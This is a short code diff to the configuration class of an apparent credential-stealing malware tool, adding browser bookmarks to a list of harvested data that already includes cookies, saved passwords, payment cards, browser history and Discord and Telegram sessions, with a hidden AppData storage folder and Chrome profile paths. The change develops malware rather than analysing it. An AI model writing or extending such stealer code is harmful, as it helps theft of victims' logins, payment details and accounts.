@@ -25,7 +25,7 @@ class MultistealerConfig:
     ZipName: str = f"{user}-st"
     StoragePath: str = rf"{user_profile}\AppData\stink"
 
-    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "processes", "cards", "discord", "telegram", "filezilla")
+    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "bookmarks", "processes", "cards", "discord", "telegram", "filezilla")
 
     ChromePaths: tuple = (
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
